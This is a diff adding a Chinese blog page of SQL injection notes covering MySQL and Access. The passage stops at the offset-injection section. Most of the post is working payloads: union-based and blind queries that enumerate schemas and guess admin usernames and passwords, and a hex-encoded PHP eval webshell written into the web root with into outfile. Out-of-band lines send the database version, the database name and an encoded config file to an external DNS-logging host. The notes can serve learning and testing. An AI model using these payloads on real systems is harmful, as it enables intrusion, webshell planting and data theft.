@@ -1,0 +1,840 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CoutCin">
+  <meta name="keywords" content="网络安全,内网安全,技术宅">
+  
+    <meta name="description" content="SQL注入-不同数据库下的注入方式,如Mysql,Mssql等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入-不同数据库下的注入方式">
+<meta property="og:url" content="https://coutcin-xw.github.io/2022/04/23/SQL%E6%B3%A8%E5%85%A5-%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="CoutCin&#39;s Blog">
+<meta property="og:description" content="SQL注入-不同数据库下的注入方式,如Mysql,Mssql等">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-23T07:14:00.000Z">
+<meta property="article:modified_time" content="2022-05-01T10:29:45.433Z">
+<meta property="article:author" content="CoutCin">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>SQL注入-不同数据库下的注入方式 - CoutCin&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"coutcin-xw.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"gtag":null,"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CoutCin&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SQL注入-不同数据库下的注入方式"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-04-23 15:14" pubdate>
+          2022年4月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          5.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SQL注入-不同数据库下的注入方式</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><h3 id="01-MySql-5-0"><a href="#01-MySql-5-0" class="headerlink" title="01. MySql &gt;&#x3D; 5.0"></a>01. MySql &gt;&#x3D; 5.0</h3><h4 id="0x01-获取字段数并确定显示位"><a href="#0x01-获取字段数并确定显示位" class="headerlink" title="0x01 获取字段数并确定显示位"></a>0x01 获取字段数并确定显示位</h4><ul>
+<li>通过order by num （num&#x3D;1,2,3···）当报错时的前一个数就是列数</li>
+</ul>
+<h4 id="0x02-获取系统数据库"><a href="#0x02-获取系统数据库" class="headerlink" title="0x02 获取系统数据库"></a>0x02 获取系统数据库</h4><ul>
+<li><code>select 1,2,schema_name from information_schema.schemata</code></li>
+</ul>
+<h4 id="0x03-获取当前数据库"><a href="#0x03-获取当前数据库" class="headerlink" title="0x03 获取当前数据库"></a>0x03 获取当前数据库</h4><ul>
+<li><code>select 1,2,database()</code></li>
+</ul>
+<h4 id="0x04-获取数据库表"><a href="#0x04-获取数据库表" class="headerlink" title="0x04 获取数据库表"></a>0x04 获取数据库表</h4><ul>
+<li><code>select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema=database()</code></li>
+<li><code>select 1,2,...,table_name from information_schema.tables where table_schema=database() limit 0,1</code></li>
+</ul>
+<h4 id="0x05-获取字段名"><a href="#0x05-获取字段名" class="headerlink" title="0x05 获取字段名"></a>0x05 获取字段名</h4><ul>
+<li><code>select 1,2,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code></li>
+</ul>
+<h4 id="0x06-获取数据"><a href="#0x06-获取数据" class="headerlink" title="0x06 获取数据"></a>0x06 获取数据</h4><ul>
+<li><code>select group_concat(字段名,字段名) from (tableName)</code></li>
+</ul>
+<h3 id="02-MySql"><a href="#02-MySql" class="headerlink" title="02. MySql&lt;5.0"></a>02. MySql&lt;5.0</h3><ul>
+<li>MySQL &lt; 5.0 没有信息数据库information_schema，所以只能手工枚举爆破（二分法思想）。 该方式通常用于盲注。</li>
+</ul>
+<h3 id="03-文件导入导出"><a href="#03-文件导入导出" class="headerlink" title="03.文件导入导出"></a>03.文件导入导出</h3><p>Mysql 中读写文件主要是load_file和into outfile 和 into dumpfile, mysql 的导入导出的功能从mysql5版本起都受 系统变量<code>@@secure_file_prev</code> 影响</p>
+<p>查看：<code>show global variables like &#39;%secure%&#39;;</code></p>
+<blockquote>
+<p>如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。 如果变量为空，则不会产生影响，引起不安全的配置。 如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从(MySQL 5.5.53)版本开始允许。</p>
+</blockquote>
+<h4 id="利用into-outfil-dumpfile写文件"><a href="#利用into-outfil-dumpfile写文件" class="headerlink" title="利用into outfil&#x2F;dumpfile写文件"></a>利用into outfil&#x2F;dumpfile写文件</h4><blockquote>
+<p>into outfile 和 into dumpfile的区别 : outfile 写完文件后会在文件后加一个<code>\n</code>换行符，而dumpfile不会</p>
+</blockquote>
+<ul>
+<li>:要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</li>
+<li>:要有file权限，默认情况下只有root有</li>
+<li>:对目录要有写权限，一般image之类的存放突破的目录就有</li>
+</ul>
+<p>如果存在以上条件，还可以注入，那么就可以用into outfile写文件</p>
+<p>例如:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/index.php?age=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x3c3f706870206576616c28245f504f53545b27736b79275d293f3e into outfile ‘H:/wamp64/www/<span class="hljs-number">233</span>.php<br></code></pre></td></tr></table></figure>
+
+<h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h4><p>1、必须有权限读取并且文件必须完全可读 　</p>
+<p>2、欲读取文件必须在服务器上</p>
+<p>3、必须指定文件完整的路径</p>
+<p>4、欲读取文件必须小于 max_allowed_packet</p>
+<p>如果存在以上条件，还可以注入，那么就可以用load_file()读文件 例如:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/index.php?age=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,load_file(‘H:/wamp64/www/<span class="hljs-number">233</span>.php’)<br></code></pre></td></tr></table></figure>
+
+<p>在mysqld的配置中设置该属性为空</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">secure-file-priv</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="OOB注入"><a href="#OOB注入" class="headerlink" title="OOB注入"></a>OOB注入</h3><p>UNC( Universal Naming Convention)&#x2F;通用命名规则 <strong>Windows主机默认存在, Linux主机默认不存在</strong></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">load_file</span>(<span class="hljs-built_in">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-built_in">version</span>(),<span class="hljs-string">&#x27;.dd.ceye.io\\a.txt&#x27;</span>));<br><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">load_file</span>(<span class="hljs-built_in">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-string">&#x27;.dd.ceye.io\\a.txt&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>当数据过长时或者包含特殊字符时可以采用如下方式</p>
+<blockquote>
+<p><code>select concat(to_ base64(substr(load_ file(&quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\my.ini&quot;),1,15)),&quot;.example.com&quot;) as result;</code> 1.使用<code>load_file()</code>读取文件内容 2.使用<code>substr()</code>对文件内容进行切片 3.使用<code>to_base64()</code> 对切片的内容进行编码 4.使用<code>concat()</code>将编码后的内容与域名进行拼接 5.使用<code>load_file()</code>访问该UNC路径</p>
+</blockquote>
+<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a><strong>无列名注入</strong></h3><p>使用<code>union select</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> c <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> b, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> `<span class="hljs-number">3</span>` <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>无逗号，有<span class="hljs-keyword">join</span>版本<br><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> `a`)m <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span> `b`)n <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span> `c`)t <span class="hljs-keyword">where</span> <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x;<br></code></pre></td></tr></table></figure>
+
+<p>盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">((<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;&#123;result+chr(mid)&#125;&#x27;</span>, <span class="hljs-built_in">cast</span>(&quot;0&quot; <span class="hljs-keyword">as</span> JSON)))<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `f1ag_1s_h3r3_hhhhh`))<br></code></pre></td></tr></table></figure>
+
+<p>要求后面select的结果必须是一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。 这里只能使用<code>concat</code>将字符型和binary拼接，使之大小写敏感，<code>JSON</code>也可以使用<code>char byte</code>代替</p>
+<h4 id="无select"><a href="#无select" class="headerlink" title="无select"></a><strong>无select</strong></h4><p><code>mysql 8.0.19</code>新增语句<code>table</code> <a href="https://gitee.com/link?target=https://dev.mysql.com/doc/refman/8.0/en/table.html">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">TABLE</span> table_name [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name] [LIMIT number [<span class="hljs-keyword">OFFSET</span> number]]<br></code></pre></td></tr></table></figure>
+
+<p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p>
+<ul>
+<li><code>table</code>总是显示表的所有列</li>
+<li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。 可以用来盲注表名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;</span><br><span class="hljs-string">(BINARY(&#x27;</span>&#123;&#125;<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure>
+
+<p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p>
+<p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p>
+<h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><p>Access数据库windows平台下的小型数据库，搭建方便，维护简单，因此一般是与windowns下的iis中间件一起用的</p>
+<h3 id="找注入点并确定数据库类型"><a href="#找注入点并确定数据库类型" class="headerlink" title="找注入点并确定数据库类型"></a>找注入点并确定数据库类型</h3><p>找注入点</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">&#x27;          ● 返回错误<span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>1=1    ● 返回正常<span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>1=2    ● 返回错误<br><span class="hljs-comment"># 满足以上条件即存在注入</span><br></code></pre></td></tr></table></figure>
+
+<p>判断iis后的数据库类型</p>
+<p>该方法是通过查询其数据特有表来进行判别的 msysobject无访问权限访问必然报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> msysobjects)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> #(报错正常，即无权限)，即可判断其为Access数据库<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sysobjects)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span>  #(报错正常)，即可判断其为MSSQL数据库<br></code></pre></td></tr></table></figure>
+
+<h3 id="猜数据库名和字段"><a href="#猜数据库名和字段" class="headerlink" title="猜数据库名和字段"></a>猜数据库名和字段</h3><p><strong>access数据库没有有效办法获取库表名，只能通过暴力破解的方式一个一个的尝试，并且access没有注释</strong></p>
+<p><strong>猜解数据库表名</strong> <strong>access数据库没有库名的概念</strong>，直接就是表</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> 表名) <br># 一个一个猜，猜中为止,例如：<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users) <br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> administrator) <br></code></pre></td></tr></table></figure>
+
+<p><strong>猜字段：</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名)<br># 一个一个猜，猜中为止 例如：<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> administrator)<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> user_name <span class="hljs-keyword">from</span> administrator)<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> administrator)<br></code></pre></td></tr></table></figure>
+
+<h3 id="爆破access中的数据"><a href="#爆破access中的数据" class="headerlink" title="爆破access中的数据"></a>爆破access中的数据</h3><h4 id="猜字段长度和数据（标准）"><a href="#猜字段长度和数据（标准）" class="headerlink" title="猜字段长度和数据（标准）"></a>猜字段长度和数据（标准）</h4><p><strong>猜解字段长度</strong> 通过上述步骤可以知道，数据库表名是“administrator”,表中字段有“user_name”和“password”。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#用返回的对错猜测</span><br><span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span class="hljs-built_in">from</span> administrator)&gt;xx<br><br><span class="hljs-comment">#如以下报错，可确定字段数目为5</span><br><span class="hljs-keyword">http</span>://xxx?id=<span class="hljs-number">14</span> <span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span class="hljs-built_in">from</span> administrator)&gt;<span class="hljs-number">3</span>    ●正常<br><span class="hljs-keyword">http</span>://xxx?id=<span class="hljs-number">14</span> <span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span class="hljs-built_in">from</span> administrator)&gt;<span class="hljs-number">4</span>   ●正常<br><span class="hljs-keyword">http</span>://xxx?id=<span class="hljs-number">14</span> <span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span class="hljs-built_in">from</span> administrator)&gt;<span class="hljs-number">5</span>  ●报错<br></code></pre></td></tr></table></figure>
+
+<p><strong>猜解字段内容</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;xx<br><br><span class="hljs-comment">#先判断第一个字母，是汉字还是字母</span><br><span class="hljs-comment">## 返回正常页面说明ASCII值大于0 ,是字母</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">0</span><br><br><span class="hljs-comment"># 二分法确定acsii码,</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">100</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">50</span><br><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> and (select top <span class="hljs-number">1</span> asc(mid(user_name,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) from administrator)&gt;<span class="hljs-number">75</span><br><br><span class="hljs-comment"># 最后根据确定下来的acsii码97，反查对应表得到第一个字母为a，在用同样的方法确定出来其他位字母</span><br><span class="hljs-comment">## 密码的话一般会做md5加密，记得用网站的解密工具尝试（简单的可以反解成功）</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>小提示: access数据库都是存放在网站目录下，后缀格式为mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，如果是MSSQL、MYSQL等，一般数据库是存储在数据库安装路径下，后缀格式为myi，myd，frm，mdf 不能通过下载得到库。除非走狗屎运，对方管理员把网站库备份在网站目录下。</p>
+</blockquote>
+<h4 id="用联合查询方案注入（通用）"><a href="#用联合查询方案注入（通用）" class="headerlink" title="用联合查询方案注入（通用）"></a>用联合查询方案注入（通用）</h4><p>首先还是要先猜解出所需的表的表名和字段名，这个没有办法 再用order by语句排序，根据排序数量，可知当前页面可查询字段数，假设为7 再通过union查询数字，确定出页面可显示的字段(假设是第2和3字段) 最后通过union语句联合查询指定表(在可显示的字段替换为需要查询的表中的字段)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">order</span> by <span class="hljs-number">7</span><br><span class="hljs-attribute">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> from admin<br><span class="hljs-attribute">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,user_name,passwoed,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> from admin<br></code></pre></td></tr></table></figure>
+
+<h3 id="偏移注入和跨库查询"><a href="#偏移注入和跨库查询" class="headerlink" title="偏移注入和跨库查询"></a>偏移注入和跨库查询</h3><h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><p>偏移注入会随机爆出一个字段内容，具体是什么看运气 偏移注入只针对Access数据库，当我们只猜到数据库表名但猜不到列名的情况下，这种方法可以帮我们填补。</p>
